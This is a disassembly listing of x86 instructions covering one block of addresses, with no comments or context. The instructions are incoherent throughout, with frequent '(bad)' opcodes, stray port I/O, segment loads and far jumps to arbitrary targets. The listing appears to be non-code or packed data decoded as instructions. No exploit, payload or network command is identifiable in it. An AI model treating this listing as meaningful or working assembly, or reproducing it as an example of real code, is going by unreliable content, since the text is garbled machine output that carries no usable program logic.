  52d040:	inc    eax
  52d041:	lods   al,BYTE PTR ds:[esi]
  52d042:	popfw  
  52d044:	sub    bh,ah
  52d046:	adc    DWORD PTR [ecx],eax
  52d048:	inc    esi
  52d049:	mov    ebp,0x55921bf3
  52d04e:	data16 jne 0x52d071
  52d051:	shr    DWORD PTR [ebx+ebp*2],0x90
  52d055:	adc    DWORD PTR [ecx],ebp
  52d057:	push   ecx
  52d058:	imul   ebx,DWORD PTR [eax+ebx*2],0xffffffe5
  52d05c:	jno    0x52d00b
  52d05e:	adc    BYTE PTR [eax+0x24f0bd3],ah
  52d064:	pop    ss
  52d065:	mov    ebp,0x1d441475
  52d06a:	jecxz  0x52d073
  52d06c:	or     dh,ch
  52d06e:	hlt    
  52d06f:	cwde   
  52d070:	xor    al,0xb7
  52d072:	fld    QWORD PTR [ebp-0x61]
  52d075:	imul   ebp,DWORD PTR [ebp+0x54],0xffffffe7
  52d079:	test   BYTE PTR [ebp+eax*8+0x29],ch
  52d07d:	pop    ds
  52d07e:	dec    ecx
  52d07f:	inc    esi
  52d080:	sar    DWORD PTR [edx-0x52ac59d2],cl
  52d086:	sub    eax,0x892912ba
  52d08b:	cs jo  0x52d071
  52d08e:	or     ch,BYTE PTR [edx+esi*2]
  52d091:	rcl    cl,cl
  52d093:	push   ebp
  52d094:	or     DWORD PTR [ebp-0x3],ecx
  52d097:	mov    ebp,0xf6d53ac8
  52d09c:	jae    0x52d054
  52d09e:	jo     0x52d107
  52d0a0:	xchg   edi,eax
  52d0a1:	xor    DWORD PTR [ebx],ecx
  52d0a3:	ds fprem1 
  52d0a6:	imul   esi,DWORD PTR [ebp-0x1649fb17],0x7ef65358
  52d0b0:	sub    ecx,DWORD PTR [edx+eax*1-0x392adcb8]
  52d0b7:	dec    eax
  52d0b8:	pop    ds
  52d0b9:	fldcw  WORD PTR [ebp-0x3]
  52d0bc:	mov    al,ds:0x15614af0
  52d0c1:	mov    BYTE PTR es:[edx],al
  52d0c4:	out    0x2e,eax
  52d0c6:	inc    edx
  52d0c7:	push   ebx
  52d0c8:	daa    
  52d0c9:	mov    bl,0x5a
  52d0cb:	stc    
  52d0cc:	mov    bh,0x9c
  52d0ce:	out    0xd3,eax
  52d0d0:	cmc    
  52d0d1:	sahf   
  52d0d2:	add    dl,BYTE PTR [ebx+ebx*1+0x7ae9c717]
  52d0d9:	repnz sbb eax,0x516928e0
  52d0df:	repnz and edi,esi
  52d0e2:	ss mov al,0xb1
  52d0e5:	iret   
  52d0e6:	(bad)  [ebx]
  52d0e8:	inc    eax
  52d0e9:	and    ch,BYTE PTR [ecx+0x28]
  52d0ec:	fstp   QWORD PTR [ebx]
  52d0ee:	shr    DWORD PTR [ecx-0x26],0x44
  52d0f2:	inc    ebx
  52d0f3:	clc    
  52d0f4:	jle    0x52d111
  52d0f6:	fs pushf 
  52d0f8:	and    DWORD PTR [ebx],esi
  52d0fa:	mov    ah,0x1a
  52d0fc:	inc    esp
  52d0fd:	cs popf 
  52d0ff:	sbb    dh,dl
  52d101:	out    dx,eax
  52d102:	xchg   edi,eax
  52d103:	pop    eax
  52d104:	pusha  
  52d105:	or     DWORD PTR [ecx],ebx
  52d107:	ins    BYTE PTR es:[edi],dx
  52d108:	mov    bl,BYTE PTR [edi+0x492b2eb4]
  52d10e:	push   0x15814179
  52d113:	shr    DWORD PTR [edi-0x62e22b83],cl
  52d119:	mov    WORD PTR [edx-0x30],es
  52d11c:	in     al,dx
  52d11d:	loop   0x52d185
  52d11f:	lods   eax,DWORD PTR ds:[esi]
  52d120:	inc    eax
  52d121:	pusha  
  52d122:	pop    ebx
  52d123:	ins    BYTE PTR es:[edi],dx
  52d124:	dec    ecx
  52d125:	xchg   edx,eax
  52d126:	inc    edx
  52d127:	std    
  52d128:	bound  ebx,QWORD PTR [ecx+0x7814b4e7]
  52d12e:	xchg   DWORD PTR [eax+0x5e],ebp
  52d131:	jb     0x52d159
  52d133:	xchg   esp,eax
  52d134:	fwait
  52d135:	(bad)  
  52d136:	cmc    
  52d137:	dec    ecx
  52d138:	rcr    eax,1
  52d13a:	mov    ah,ah
  52d13c:	pushf  
  52d13d:	ret    
  52d13e:	repnz xchg edi,eax
  52d140:	mov    esi,0xb634d095
  52d145:	hlt    
  52d146:	pop    ebp
  52d147:	sub    eax,0x8eed5f86
  52d14c:	push   0xa4cab4c7
  52d151:	mov    esp,0x6d51d327
  52d156:	inc    esi
  52d157:	retf   0x522b
  52d15a:	push   edi
  52d15b:	(bad)  
  52d15c:	sub    eax,0x1a3ce34d
  52d161:	jmp    0x1967:0x4160da05
  52d168:	sbb    al,bh
  52d16a:	jae    0x52d11d
  52d16c:	dec    esi
  52d16d:	push   ecx
  52d16e:	aas    
  52d16f:	dec    edi
  52d170:	pop    ds
  52d171:	jmp    0x52d191
  52d173:	adc    dl,BYTE PTR [eax-0x9ac9007]
  52d179:	in     al,dx
  52d17a:	clc    
  52d17b:	out    0x33,al
  52d17d:	(bad)
  52d180:	adc    al,0x44
  52d182:	addr16 cwde 
  52d184:	inc    esi
  52d185:	mov    DWORD PTR ds:0x2052125c,ebx
  52d18b:	ins    DWORD PTR es:[edi],dx
  52d18c:	loop   0x52d126
  52d18e:	shr    DWORD PTR [esi-0x3e],1
  52d191:	out    dx,al
  52d192:	daa    
  52d193:	xor    eax,0x31a7d978
  52d198:	xchg   bh,cl
  52d19a:	loopne 0x52d134
  52d19c:	adc    BYTE PTR [ebx-0x60],dl
  52d19f:	adc    bl,BYTE PTR [edx]
  52d1a1:	pop    ebp
  52d1a2:	aam    0xe5
  52d1a4:	sbb    al,BYTE PTR fs:[eax-0x22a7cf1d]
  52d1ab:	inc    eax
  52d1ad:	aad    0xcb
  52d1af:	popf   
  52d1b0:	push   cs
  52d1b1:	mov    edx,0x5dd3b19d
  52d1b6:	imul   edi,DWORD PTR [ebp+0x32],0x43f3f3f9
  52d1bd:	or     ecx,DWORD PTR [edi]
  52d1bf:	clc    
  52d1c0:	add    eax,0xde46a3a9
  52d1c5:	or     dl,bl
  52d1c7:	jmp    0xd6d029d9
  52d1cc:	xchg   ecx,eax
  52d1cd:	mov    dh,0x40
  52d1cf:	sub    dl,al
  52d1d1:	xor    bl,bl
  52d1d3:	data16 and cl,dh
  52d1d6:	ror    BYTE PTR [ebx],1
  52d1d8:	loope  0x52d1bb
  52d1da:	ffree  st(0)
  52d1dc:	mov    dh,0x9b
  52d1de:	inc    esi
  52d1df:	mov    ds:0x38356014,al
  52d1e4:	(bad)  
  52d1e5:	sbb    eax,0x28bd8a40
  52d1ea:	scas   al,BYTE PTR es:[edi]
  52d1eb:	mov    DWORD PTR [eax-0x40],ebx
  52d1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52d1ef:	outs   dx,BYTE PTR ds:[esi]
  52d1f0:	(bad)  
  52d1f1:	and    al,0x5
  52d1f3:	mov    ds:0x46005521,al
  52d1f8:	mov    ds:0x30ee4a71,al
  52d1fd:	imul   ecx,DWORD PTR [ebp-0x1cde3e41],0xb1e63e36
  52d207:	loopne 0x52d230
  52d209:	sub    eax,0xc98f072d
  52d20e:	cs push ds
  52d210:	cmp    al,0xcb
  52d212:	imul   ebp,DWORD PTR [edx-0x7ce3bf82],0xc045cc91
  52d21c:	dec    eax
  52d21d:	pop    es
  52d21e:	int    0x80
  52d220:	or     eax,DWORD PTR [esi-0x71f6cb8a]
  52d226:	and    ch,bh
  52d228:	adc    BYTE PTR [eax-0x75],ah
  52d22b:	sub    DWORD PTR [ecx+0x12],ebp
  52d22e:	nop    DWORD PTR [edx]
  52d231:	add    DWORD PTR [esi+0x14],ebx
  52d234:	das    
  52d235:	mov    al,fs:0x544824dd
  52d23b:	cmp    dl,bh
  52d23d:	loope  0x52d276
  52d23f:	dec    ebx
  52d240:	pushf  
  52d241:	adc    al,0x36
  52d243:	xor    eax,0xd881b276
  52d248:	push   eax
  52d249:	and    esi,esp
  52d24b:	cli    
  52d24c:	inc    esp
  52d24d:	push   esp
  52d24e:	test   BYTE PTR [edx+ecx*1],0xee
  52d252:	and    DWORD PTR [edi+ebp*2+0x29],ebp
  52d256:	es scas eax,DWORD PTR es:[edi]
  52d258:	inc    ecx
  52d259:	pop    es
  52d25a:	jbe    0x52d20a
  52d25c:	imul   esp,DWORD PTR [edx+0x45226d7c],0xffffffda
  52d263:	sub    BYTE PTR [ecx],bl
  52d265:	push   ebp
  52d266:	push   edx
  52d267:	dec    ecx
  52d268:	hlt    
  52d269:	mov    bl,0xf8
  52d26b:	shr    DWORD PTR [eax-0x6a01538d],cl
  52d271:	xchg   ecx,eax
  52d272:	add    BYTE PTR ds:0x19130e8d,bl
  52d278:	mov    ds:0xccfed9a4,eax
  52d27d:	std    
  52d27e:	xchg   BYTE PTR [ecx-0x52],ah
  52d281:	xchg   DWORD PTR [ebx+0x74],edx
  52d284:	fbld   TBYTE PTR [ebp+0x57a23e83]
  52d28a:	ret    
  52d28b:	xchg   ecx,eax
  52d28c:	(bad)  
  52d28e:	enter  0x5569,0x1a
  52d292:	pop    es
  52d293:	inc    ebx
  52d294:	sub    ebx,eax
  52d296:	popa   
  52d297:	mov    BYTE PTR [eax],al
  52d299:	mov    DWORD PTR [edx],0x62f69fe3
  52d29f:	sub    al,0x42
  52d2a2:	sbb    DWORD PTR es:[eax+0x503a36ef],edx
  52d2a9:	and    eax,0x4ee1e0a3
  52d2ae:	adc    al,BYTE PTR [esi-0x4f56c059]
  52d2b4:	cmp    DWORD PTR [ecx-0x1281b38f],eax
  52d2ba:	mov    ebp,0x5f098a67
  52d2bf:	adc    al,0xaf
  52d2c1:	mov    BYTE PTR [ecx-0x69bc9b07],0x6d
  52d2c8:	loop   0x52d275
  52d2ca:	daa    
  52d2cb:	cmp    edx,DWORD PTR [ebp+ecx*4-0x4175b363]
  52d2d2:	fst    DWORD PTR [edx+0x48]
  52d2d5:	jle    0x52d2ba
  52d2d7:	mov    ds:0xdd1318be,eax
  52d2dc:	std    
  52d2dd:	jg     0x52d355
  52d2df:	pop    ss
  52d2e0:	xchg   edx,eax
  52d2e1:	std    
  52d2e2:	in     eax,0xd0
  52d2e4:	fdiv   DWORD PTR [ebx-0x7e]
  52d2e7:	push   ebp
  52d2e8:	je     0x52d298
  52d2ea:	hlt    
  52d2eb:	jecxz  0x52d32d
  52d2ed:	test   DWORD PTR [ebp-0x667fddb],ecx
  52d2f3:	xchg   BYTE PTR [esi+edi*2+0x1e],ch
  52d2f7:	ds dec esi
  52d2f9:	repz sbb ch,BYTE PTR [edi-0x26ee2cff]
  52d300:	sbb    eax,0x95cc455c
  52d305:	out    0x2b,al
  52d307:	shr    dl,1
  52d309:	ror    edx,1
  52d30b:	int3   
  52d30c:	cmp    esi,DWORD PTR [eax+eax*8]
  52d30f:	std    
  52d310:	jne    0x52d2a6
  52d312:	mov    bl,0x45
  52d314:	shr    BYTE PTR [ecx-0x43d347d2],1
  52d31a:	pop    ss
  52d31b:	cdq    
  52d31c:	mov    bl,0x30
  52d31e:	fild   QWORD PTR [esi-0x1a9b0178]
  52d324:	loop   0x52d2f0
  52d326:	jne    0x52d2f4
  52d328:	mov    ds:0xfe75003c,al
  52d32d:	outs   dx,DWORD PTR ds:[esi]
  52d32e:	xor    al,0x0
  52d330:	pop    ebx
  52d331:	jbe    0x52d2cd
  52d333:	add    al,0x4
  52d335:	push   esi
  52d336:	daa    
  52d337:	xchg   DWORD PTR [edi+0x78],edx
  52d33a:	push   0xffffffdf
  52d33c:	jl     0x52d2be
  52d33e:	cs push ds
  52d340:	inc    ebp
  52d341:	cmp    DWORD PTR [edi+0x72],edi
  52d344:	call   FWORD PTR [eax]
  52d346:	(bad)  
  52d347:	pop    edi
  52d348:	retf   0x42e0
  52d34b:	jns    0x52d318
  52d34d:	loopne 0x52d322
  52d34f:	pop    esp
  52d350:	jne    0x52d2ed
  52d352:	xor    al,0xe
  52d354:	ret    0x7dda
  52d357:	bound  edx,QWORD PTR [eax]
  52d359:	xor    edi,esi
  52d35b:	stc    
  52d35c:	lock xor edx,DWORD PTR [eax-0x35df642f]
  52d363:	jg     0x52d323
  52d365:	xchg   edi,eax
  52d366:	out    dx,al
  52d367:	scas   eax,DWORD PTR es:[edi]
  52d368:	pushf  
  52d369:	lods   al,BYTE PTR ds:[esi]
  52d36a:	push   0x7489518c
  52d36f:	mov    WORD PTR [edx-0x52983b7e],ds
  52d375:	scas   eax,DWORD PTR es:[edi]
  52d376:	leave  
  52d377:	pop    es
  52d378:	pop    ss
  52d379:	sbb    al,0xd7
  52d37b:	mov    bl,0xa
  52d37d:	test   DWORD PTR [ebx+0x616c3a8c],edi
  52d383:	jmp    0xc7d8:0x356cdaa9
  52d38a:	inc    eax
  52d38b:	jle    0x52d384
  52d38d:	and    DWORD PTR [eax-0x3e],esi
  52d390:	ja     0x52d377
  52d392:	je     0x52d3a5
  52d394:	mov    ah,0xfb
  52d396:	jns    0x52d38b
  52d398:	mov    DWORD PTR [edx+0x7d4277e8],esi
  52d39e:	jl     0x52d3d1
  52d3a0:	sahf   
  52d3a1:	bound  esi,QWORD PTR [ecx-0x4d90a97d]
  52d3a7:	mov    al,0x5c
  52d3a9:	mov    WORD PTR [esi+0x67],ss
  52d3ac:	int3   
  52d3ad:	std    
  52d3ae:	mov    bh,0x16
  52d3b0:	jge    0x52d3f0
  52d3b2:	mul    DWORD PTR [esi-0x2a]
  52d3b5:	adc    eax,0xc1508242
  52d3ba:	and    eax,0xae009793
  52d3bf:	cmp    eax,DWORD PTR [ecx+0x39]
  52d3c2:	xor    bh,BYTE PTR [ebp-0x5e]
  52d3c5:	ins    DWORD PTR es:[edi],dx
  52d3c6:	test   DWORD PTR [edi+ecx*8],ebx
  52d3c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52d3ca:	repnz xchg edx,eax
  52d3cc:	out    dx,al
  52d3cd:	stos   BYTE PTR es:[edi],al
  52d3ce:	fisttp WORD PTR [ebx+0x593fa623]
  52d3d4:	pop    esi
  52d3d5:	dec    eax
  52d3d6:	in     al,0xdb
  52d3d8:	lods   al,BYTE PTR ds:[esi]
  52d3d9:	xor    eax,0xd1145f28
  52d3de:	ja     0x52d3b4
  52d3e0:	xor    ah,BYTE PTR [eax-0x67]
  52d3e3:	mov    bh,0xed
  52d3e5:	push   ebp
  52d3e6:	(bad)  
  52d3e8:	and    edx,esp
  52d3ea:	and    DWORD PTR [edi],edx
  52d3ec:	in     eax,dx
  52d3ed:	pop    ebp
  52d3ee:	cmp    BYTE PTR [ecx+0x4c2c6f13],0x3a
  52d3f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52d3f6:	cwde   
  52d3f7:	test   dl,dh
  52d3f9:	inc    ebx
  52d3fa:	xchg   ecx,eax
  52d3fb:	pop    ss
  52d3fc:	push   cs
  52d3fd:	neg    BYTE PTR [ecx-0xecc8725]
  52d403:	inc    eax
  52d404:	push   es
  52d405:	and    dh,cl
  52d407:	rcl    BYTE PTR [ecx-0x47],cl
  52d40a:	loop   0x52d44c
  52d40c:	push   esp
  52d40d:	and    eax,0x52eaeb95
  52d412:	jns    0x52d3a0
  52d414:	pop    ss
  52d415:	int    0xfb
  52d417:	stc    
  52d418:	cmc    
  52d419:	fsubp  st(4),st
  52d41b:	cmp    dh,BYTE PTR [bp+di-0x6ff9]
  52d420:	nop
  52d421:	and    BYTE PTR [esi],0xe0
  52d424:	push   esp
  52d425:	push   es
  52d426:	and    esp,edi
  52d428:	mov    ecx,0xa64a508c
  52d42d:	or     eax,0xe2bf42ac
  52d432:	test   BYTE PTR [edx],0xe0
  52d435:	sar    BYTE PTR [edi+0x6b1967b2],1
  52d43b:	xlat   BYTE PTR ds:[ebx]
  52d43c:	int    0xf5
  52d43e:	hlt    
  52d43f:	push   esp
  52d440:	add    edi,DWORD PTR [edx]
  52d442:	dec    ebx
  52d443:	mov    ds:0x90481e28,al
  52d448:	push   es
  52d449:	lahf   
  52d44a:	fidivr DWORD PTR [ebx]
  52d44c:	lock mov cs,WORD PTR [edx+0x59]
  52d450:	mov    bl,0x78
  52d452:	jnp    0x52d41f
  52d454:	xor    al,0x62
  52d456:	mov    esi,0xce168d98
  52d45b:	fiadd  DWORD PTR [ebx]
  52d45d:	and    eax,0x74af2b99
  52d462:	stos   BYTE PTR es:[edi],al
  52d463:	sbb    eax,0xc3befab
  52d468:	pop    edx
  52d469:	test   al,0xc9
  52d46b:	push   eax
  52d46c:	jno    0x52d4e5
  52d46e:	cli    
  52d46f:	pop    ebx
  52d470:	je     0x52d45d
  52d472:	(bad)  
  52d473:	xchg   ebx,eax
  52d474:	jns    0x52d450
  52d476:	jl     0x52d423
  52d478:	jl     0x52d493
  52d47a:	push   ecx
  52d47b:	add    bl,BYTE PTR [esi+0x6314736e]
  52d481:	or     ebp,DWORD PTR [ebx-0x48]
  52d484:	mov    eax,ds:0x265f64ee
  52d489:	repz dec ebx
  52d48b:	jmp    0x52d45a
  52d48d:	add    al,0x9f
  52d48f:	dec    eax
  52d490:	fucomp st(5)
  52d492:	or     edi,DWORD PTR [edx+eiz*2-0x6a439489]
  52d499:	dec    edx
  52d49a:	lods   eax,DWORD PTR ds:[esi]
  52d49b:	dec    ebx
  52d49c:	jp     0x52d4fa
  52d49e:	aaa    
  52d49f:	pop    esi
  52d4a0:	mov    al,0x12
  52d4a2:	(bad)  
  52d4a3:	push   ds
  52d4a4:	stc    
  52d4a5:	in     eax,0xea
  52d4a7:	pop    ebp
  52d4a8:	das    
  52d4a9:	push   ss
  52d4aa:	inc    esp
  52d4ab:	mov    bl,0xb7
  52d4ad:	mov    eax,ds:0x7ef2134b
  52d4b2:	popa   
  52d4b3:	loop   0x52d4e0
  52d4b5:	stc    
  52d4b6:	pop    ds
  52d4b7:	push   es
  52d4b8:	pop    DWORD PTR [esi]
  52d4ba:	icebp  
  52d4bb:	xor    cl,ch
  52d4bd:	jg     0x52d4ec
  52d4bf:	jae    0x52d50d
  52d4c1:	xchg   ecx,eax
  52d4c2:	fadd   QWORD PTR [ebp+0x350df5c]
  52d4c8:	mov    dl,0x17
  52d4ca:	cli    
  52d4cb:	cmp    edx,DWORD PTR [edx]
  52d4cd:	pop    ebx
  52d4ce:	fst    DWORD PTR [edx+esi*2+0x15763683]
  52d4d5:	imul   ecx,ebx,0x4f
  52d4d8:	scas   al,BYTE PTR es:[edi]
  52d4d9:	push   ebx
  52d4da:	jmp    0x37ca:0xcad28443
  52d4e1:	sahf   
  52d4e2:	push   ds
  52d4e3:	ret    0x667b
  52d4e6:	add    BYTE PTR [edi],0x65
  52d4e9:	fsub   QWORD PTR [ecx-0x13]
  52d4ec:	adc    dl,bl
  52d4ee:	mov    al,0x64
  52d4f0:	stos   BYTE PTR es:[edi],al
  52d4f1:	xchg   BYTE PTR [eax+edi*8-0x5b03cfba],ch
  52d4f8:	mov    al,ds:0x8ae6f463
  52d4fd:	add    al,bh
  52d4ff:	(bad)  [ebx-0x71]
  52d502:	neg    BYTE PTR [eax+0x6f]
  52d505:	pusha  
  52d506:	sbb    al,0x36
  52d508:	cmp    ebp,DWORD PTR [esi]
  52d50a:	ds pusha 
  52d50c:	sbb    al,0x13
  52d50e:	lock jp 0x52d52f
  52d511:	add    ah,bh
  52d513:	int    0xae
  52d515:	loope  0x52d52a
  52d517:	mov    ch,0xfa
  52d519:	popa   
  52d51a:	out    dx,eax
  52d51b:	icebp  
  52d51c:	sbb    BYTE PTR [ecx+eiz*1+0x58],ch
  52d520:	cli    
  52d521:	shr    DWORD PTR [ebp-0xbbecea7],1
  52d527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52d528:	in     eax,0xbd
  52d52a:	xor    DWORD PTR [eax],0xfffffffa
  52d52d:	jb     0x52d4f4
  52d52f:	adc    BYTE PTR [eax],0xac
  52d532:	or     BYTE PTR [eax+0x2ec37b83],bh
  52d538:	stos   BYTE PTR es:[edi],al
  52d539:	popa   
  52d53a:	and    bl,BYTE PTR cs:[esi]
  52d53d:	data16 mov WORD PTR [ebx-0x6e],gs
  52d541:	outs   dx,BYTE PTR ds:[esi]
  52d542:	pop    eax
  52d543:	ss add al,0x75
  52d546:	mov    esp,0x91dd3c61
  52d54b:	fsubr  DWORD PTR [esi+0x30]
  52d54e:	pushf  
  52d54f:	adc    ah,BYTE PTR [ecx+0x679d4c5b]
  52d555:	push   esi
  52d556:	inc    edx
  52d557:	add    DWORD PTR [edx],edx
  52d559:	mov    dh,0xf8
  52d55b:	sbb    eax,0x5f78cd35
  52d560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52d561:	rol    DWORD PTR [edx-0x59],0x16
  52d565:	push   ss
  52d566:	xor    esi,ebx
  52d568:	stc    
  52d569:	push   0x607f6962
  52d56e:	hlt    
  52d56f:	test   al,0xff
  52d571:	fsub   DWORD PTR [edi-0x1459fa6f]
  52d577:	add    BYTE PTR [eax+0x2a701fd3],0x7d
  52d57e:	mov    edx,0x353e3855
  52d583:	sub    DWORD PTR [ebp+0x67c7834a],ebx
  52d589:	jns    0x52d5da
  52d58b:	fcmovu st,st(7)
  52d58d:	imul   DWORD PTR [esi+0x2]
  52d590:	xor    al,BYTE PTR [ecx-0x6c]
  52d593:	sbb    al,0xa7
  52d595:	rcl    DWORD PTR [ebp+0x62],cl
  52d598:	(bad)  
  52d599:	mov    ebp,0xc6aaed2e
  52d59e:	call   0x5cb6:0xacd09969
  52d5a5:	xchg   ebp,eax
  52d5a6:	les    edi,FWORD PTR [ebx-0xa348fda]
  52d5ac:	inc    edx
  52d5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52d5ae:	push   ebp
  52d5af:	fild   WORD PTR fs:[edx+0x51]
  52d5b3:	lea    edx,[ebp+0x3c]
  52d5b6:	push   edx
  52d5b7:	push   ebp
  52d5b8:	xor    esi,DWORD PTR [edx]
  52d5ba:	fcomp  DWORD PTR [eax+0x63]
  52d5bd:	cwde   
  52d5be:	mov    BYTE PTR [edi-0x64071e2e],dl
  52d5c4:	push   ds
  52d5c5:	clc    
  52d5c6:	(bad)  
  52d5c7:	and    eax,DWORD PTR [edi-0x78]
  52d5ca:	into   
  52d5cb:	push   esi
  52d5cc:	lea    eax,[edi-0x80]
  52d5cf:	push   esp
  52d5d0:	(bad)  
  52d5d1:	xor    al,0xf3
  52d5d3:	cmp    esi,DWORD PTR [ecx-0x3e02804e]
  52d5d9:	mov    ebp,DWORD PTR [ebx+esi*8]
  52d5dc:	dec    edi
  52d5dd:	outs   dx,DWORD PTR ds:[esi]
  52d5de:	push   edx
  52d5df:	pop    ds
  52d5e0:	pop    es
  52d5e1:	mul    DWORD PTR [ebp-0x5686b541]
  52d5e7:	or     BYTE PTR [ecx+0x3d],al
  52d5ea:	push   esi
  52d5eb:	mov    BYTE PTR [ebp-0x7fdd83f1],al
  52d5f1:	and    esp,DWORD PTR [ecx+0x2c]
  52d5f4:	mov    ah,0x2c
  52d5f6:	cmp    dh,BYTE PTR [ecx]
  52d5f8:	popf   
  52d5f9:	dec    ebx
  52d5fa:	mov    bh,0x89
  52d5fc:	outs   dx,DWORD PTR ds:[esi]
  52d5fd:	pop    es
  52d5fe:	dec    ebx
  52d5ff:	jmp    0xcb3a:0xd095a5fb
  52d606:	xchg   edi,eax
  52d607:	fdiv   QWORD PTR [edi+esi*2]
  52d60a:	add    BYTE PTR [ecx],bh
  52d60c:	imul   eax,esp,0x89b60c49
  52d612:	stos   DWORD PTR es:[edi],eax
  52d613:	fidivr WORD PTR [ebx-0x1ce6fb16]
  52d619:	and    al,0x52
  52d61b:	cwde   
  52d61c:	jno    0x52d674
  52d61e:	sub    al,0x77
  52d620:	std    
  52d621:	xchg   DWORD PTR [edi-0x7b0d0882],eax
  52d627:	test   al,0x59
  52d629:	gs adc eax,0x73b321d0
  52d62f:	in     eax,0xdd
  52d631:	shl    DWORD PTR [ecx+0x73],1
  52d634:	in     eax,dx
  52d635:	into   
  52d636:	jo     0x52d65c
  52d638:	push   ds
  52d639:	mov    ds:0xb03c67e5,eax
  52d63e:	dec    edx
  52d63f:	outs   dx,BYTE PTR ds:[esi]
  52d640:	mov    edx,0x738fb07c
  52d645:	lahf   
  52d646:	out    0x18,eax
  52d648:	pop    ds
  52d649:	inc    ecx
  52d64a:	adc    al,0x76
  52d64c:	add    ecx,ebp
  52d64e:	lahf   
  52d64f:	push   ss
  52d650:	hlt    
  52d651:	mov    dh,ah
  52d653:	dec    eax
  52d654:	jae    0x52d69d
  52d656:	loopne 0x52d5ee
  52d658:	js     0x52d65f
  52d65a:	sub    al,0x42
  52d65c:	sbb    BYTE PTR [edx],dl
  52d65e:	imul   esp,DWORD PTR [ecx+0x2b],0xffffffc8
  52d662:	pop    esp
  52d663:	jae    0x52d663
  52d665:	stc    
  52d666:	xchg   esi,eax
  52d667:	leave  
  52d668:	test   al,0x8b
  52d66a:	retf   
  52d66b:	clc    
  52d66c:	push   ebp
  52d66d:	jmp    0x2b518d1d
  52d672:	mov    ecx,es
  52d674:	test   DWORD PTR [eax+0x1],ecx
  52d677:	push   0xffffffc0
  52d679:	adc    BYTE PTR [esp+eax*4],dl
  52d67c:	add    ebp,DWORD PTR [edx]
  52d67e:	mov    al,0x45
  52d680:	pop    esp
  52d681:	pop    esi
  52d682:	in     al,0x3e
  52d684:	jmp    0x52d6c8
  52d686:	dec    edx
  52d687:	adc    DWORD PTR ds:0x9070a238,eax
  52d68d:	add    ebp,0x6b
  52d690:	sbb    al,0xc9
  52d692:	scas   eax,DWORD PTR es:[edi]
  52d693:	or     bh,BYTE PTR ds:0xa95e0961
  52d699:	test   eax,0xc8b14ea5
  52d69e:	not    BYTE PTR [esi-0x58]
  52d6a1:	cld    
  52d6a2:	pop    edi
  52d6a3:	xor    bh,al
  52d6a5:	dec    ecx
  52d6a6:	inc    ebx
  52d6a7:	out    dx,eax
  52d6a8:	xchg   esp,eax
  52d6a9:	cmp    eax,0x5cc7b6f1
  52d6ae:	cmp    al,0x53
  52d6b0:	xchg   BYTE PTR [eax+0x77ffa745],ch
  52d6b6:	sub    bl,BYTE PTR [esi-0x6fe6d19e]
  52d6bc:	cmc    
  52d6bd:	bound  esp,QWORD PTR [ebx-0xb1352f4]
  52d6c3:	nop
  52d6c4:	adc    eax,ecx
  52d6c6:	lea    ecx,[edx-0x3e]
  52d6c9:	push   0x723a6e73
  52d6ce:	mov    ds:0xe8742df9,al
  52d6d3:	xor    bh,BYTE PTR [esi+ebp*8+0x126d2e66]
  52d6da:	push   ecx
  52d6db:	and    al,0xc6
  52d6dd:	sub    ebp,ebx
  52d6df:	sub    ecx,ebx
  52d6e1:	int3   
  52d6e2:	iret   
  52d6e3:	mov    dl,0x51
  52d6e5:	js     0x52d755
  52d6e7:	cmp    eax,0x7fd189c1
  52d6ec:	and    BYTE PTR [ecx+0x50],al
  52d6ef:	vandnps ymm4,ymm7,ymm1
  52d6f3:	out    0x28,al
  52d6f5:	xor    cl,BYTE PTR [edx+0x5ad9f071]
  52d6fb:	jae    0x52d69d
  52d6fd:	jecxz  0x52d730
  52d6ff:	pop    esi
  52d700:	add    al,0x3b
  52d702:	sub    DWORD PTR [edi],0xffffff8a
  52d705:	nop
  52d706:	in     al,0x15
  52d708:	add    ebp,esp
  52d70a:	sbb    ebp,DWORD PTR [ebp+edx*4-0x6b620de7]
  52d711:	test   DWORD PTR [ebx+ecx*1+0x41],0x60903346
  52d719:	jo     0x52d6cc
  52d71b:	push   ebp
  52d71c:	jp     0x4ee68123
  52d722:	dec    edx
  52d723:	ror    BYTE PTR [ecx],1
  52d725:	and    DWORD PTR [esi],ecx
  52d727:	loopne 0x52d6cd
  52d729:	xchg   edi,eax
  52d72a:	xchg   ebx,eax
  52d72b:	jl     0x52d75f
  52d72d:	xchg   ah,cl
  52d72f:	push   esi
  52d730:	int3   
  52d731:	sub    al,dh
  52d733:	add    edi,edi
  52d735:	es hlt 
  52d737:	sbb    al,0x3f
  52d739:	jle    0x52d6f4
  52d73b:	std    
  52d73c:	xchg   ebp,eax
  52d73d:	xor    bl,al
  52d73f:	add    ebx,edx
  52d741:	cs or  al,0xb7
  52d744:	stos   DWORD PTR es:[edi],eax
  52d745:	sub    DWORD PTR [esi+eiz*1-0x1829a979],edx
  52d74c:	std    
  52d74d:	push   ecx
  52d74e:	mov    esp,0x2ef51f01
  52d753:	dec    edx
  52d754:	iret   
  52d755:	aad    0x52
  52d757:	add    BYTE PTR [edi+0x6a],dl
  52d75a:	scas   al,BYTE PTR es:[edi]
  52d75b:	mov    cl,0x0
  52d75d:	std    
  52d75e:	cmovno esp,DWORD PTR [edi]
  52d761:	xchg   DWORD PTR [edi+0x2f],eax
  52d764:	shr    BYTE PTR [eax+0x4c],cl
  52d767:	inc    edi
  52d768:	std    
  52d769:	test   al,ah
  52d76b:	add    eax,0x10ad48c6
  52d770:	call   0x12c3aff3
  52d775:	loope  0x52d722
  52d777:	xor    eax,0x20b47f03
  52d77c:	jb     0x52d76b
  52d77e:	aaa    
  52d77f:	in     eax,0xa9
  52d781:	mov    ah,dh
  52d783:	push   eax
  52d784:	or     al,0xc4
  52d786:	and    al,0x3d
  52d788:	push   esp
  52d789:	aaa    
  52d78a:	mov    edx,DWORD PTR [esi-0xfc09e4d]
  52d790:	jne    0x52d745
  52d792:	in     eax,0x51
  52d794:	sbb    eax,0xdf0ce0c4
  52d799:	enter  0x21c5,0x1
  52d79d:	icebp  
  52d79e:	mov    ebx,0x983bcbf3
  52d7a3:	dec    ecx
  52d7a4:	mov    bh,0x7b
  52d7a6:	jo     0x52d80f
  52d7a8:	inc    ebp
  52d7a9:	cmp    DWORD PTR [eax+0x21851616],edi
  52d7af:	call   0x6593:0x6e9baccf
